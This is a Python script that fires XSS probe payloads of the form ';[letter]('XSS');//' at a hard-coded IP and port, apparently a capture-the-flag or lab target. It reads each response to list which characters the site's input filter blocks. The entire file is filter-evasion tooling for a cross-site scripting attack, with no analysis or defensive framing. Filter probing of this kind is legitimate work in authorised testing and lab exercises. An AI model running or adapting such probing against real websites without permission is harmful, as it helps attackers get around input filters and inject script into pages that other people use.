import requests
import urllib.parse

# Target URL
url = "http://94.237.49.241:4200/page"

# Headers
headers = {
    "Host": "94.237.49.241:4200",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://94.237.49.241:4200",
    "Connection": "close",
    "Referer": "http://94.237.49.241:4200/page",
    "Upgrade-Insecure-Requests": "1"
}

# Letters to test
letters_to_test = ['p', 'q', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']

print("=" * 60)
print("Testing individual letters for character filter blocking")
print("=" * 60)
print()

blocked_chars = []
allowed_chars = []

for letter in letters_to_test:
    # Create payload: name=;[letter]('XSS');//
    payload = f"name=;{letter}('XSS');//"
    
    print(f"Testing letter: '{letter}'")
    print(f"Payload: {payload}")
    
    try:
        # Send POST request
        response = requests.post(url, headers=headers, data=payload, timeout=10)
        
        # Check if the response contains the blocked message pattern
        blocked_pattern = f"Sorry you can't use: '{letter}'"
        
        if blocked_pattern in response.text:
            print(f"  [BLOCKED] Character '{letter}' is blocked by filter")
            print(f"  Response contains: '{blocked_pattern}'")
            blocked_chars.append(letter)
            # Print relevant part of response
            lines = response.text.split('\n')
            for line in lines:
                if blocked_pattern in line:
                    print(f"  Response line: {line.strip()}")
        else:
            print(f"  [ALLOWED] Character '{letter}' is NOT blocked")
            allowed_chars.append(letter)
            # Print a snippet to confirm
            if len(response.text) > 0:
                # Look for interesting patterns in response
                if "Hello" in response.text or "XSS" in response.text or "alert" in response.text:
                    print(f"  Response contains execution-related content")
        
        print(f"  Status Code: {response.status_code}")
        print()
        
    except Exception as e:
        print(f"  [ERROR] Failed to test letter '{letter}': {str(e)}")
        print()

# Summary
print("=" * 60)
print("SUMMARY")
print("=" * 60)
print(f"Blocked characters ({len(blocked_chars)}):")
for char in blocked_chars:
    print(f"  - '{char}'")

print()
print(f"Allowed characters ({len(allowed_chars)}):")
for char in allowed_chars:
    print(f"  - '{char}'")

print()
print("Character filter test completed.")
